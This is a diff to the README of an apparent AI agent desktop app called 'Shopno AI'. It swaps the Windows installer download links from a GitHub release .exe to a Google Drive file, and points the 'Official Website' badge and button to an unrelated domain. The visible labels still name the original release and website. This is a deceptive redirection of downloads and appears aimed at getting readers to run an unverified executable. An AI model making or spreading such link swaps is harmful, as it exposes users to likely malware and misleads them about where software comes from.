@@ -6,20 +6,20 @@
   ### The Sovereign Autonomous AI & Multi-Agent Swarm Operating System
   **454+ Native Tools • 4,000+ Skills • 60,000+ Open VSX Extensions • 7 Billion Tokens Freedom • 1-Click MCP Suite**
 
-  [![Release](https://img.shields.io/badge/Release-v1.1.18_Stable_Fix-00d4aa?style=for-the-badge&logo=rocket&logoColor=white)](https://github.com/CyberPrince-Alien/Shopno-AI/releases/download/Version1.1.1_Final/Shopno.Desktop_1.1.18_x64-setup.exe)
+  [![Release](https://img.shields.io/badge/Release-v1.1.18_Stable_Fix-00d4aa?style=for-the-badge&logo=rocket&logoColor=white)]([https://github.com/CyberPrince-Alien/Shopno-AI/releases/download/Version1.1.1_Final/Shopno.Desktop_1.1.18_x64-setup.exe](https://drive.google.com/file/d/15BrCcw5WmidIVBxj2KcALHxzl6IcPLk3/view?usp=drive_link))
   [![Tools](https://img.shields.io/badge/Native_Tools-454+-8b5cf6?style=for-the-badge&logo=terminal&logoColor=white)](https://shopno.freedev.app/)
   [![Skills](https://img.shields.io/badge/Built--in_Skills-4%2C000+-06b6d4?style=for-the-badge&logo=codewars&logoColor=white)](https://shopno.freedev.app/)
   [![Promo](https://img.shields.io/badge/100%25_FREE_PROMO-SHOPNO-10b981?style=for-the-badge&logo=ticket&logoColor=white)](https://shopno.freedev.app/)
-  [![Website](https://img.shields.io/badge/Official_Website-shopno.freedev.app-blue?style=for-the-badge&logo=google-chrome&logoColor=white)](https://shopno.freedev.app/)
+  [![Website](https://img.shields.io/badge/Official_Website-shopno.freedev.app-blue?style=for-the-badge&logo=google-chrome&logoColor=white)](https://surveymentor.org/)
   [![Architect](https://img.shields.io/badge/Architect-Cyber_Prince-purple?style=for-the-badge&logo=github)](https://github.com/CyberPrince-Alien)
   [![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)](LICENSE.md)
 
   <br><br>
 
-  <a href="https://github.com/CyberPrince-Alien/Shopno-AI/releases/download/Version1.1.1_Final/Shopno.Desktop_1.1.18_x64-setup.exe">
+  <a href="https://drive.google.com/file/d/15BrCcw5WmidIVBxj2KcALHxzl6IcPLk3/view?usp=drive_link">
     <img src="https://img.shields.io/badge/DOWNLOAD_SHOPNO_DESKTOP_(WINDOWS_x64)-00d4aa?style=for-the-badge&logo=windows&logoColor=black" height="42" />
   </a>
-  <a href="https://shopno.freedev.app/">
+  <a href="https://surveymentor.org/">
     <img src="https://img.shields.io/badge/VISIT_OFFICIAL_WEBSITE-0d1428?style=for-the-badge&logo=safari&logoColor=white" height="42" />
   </a>
 
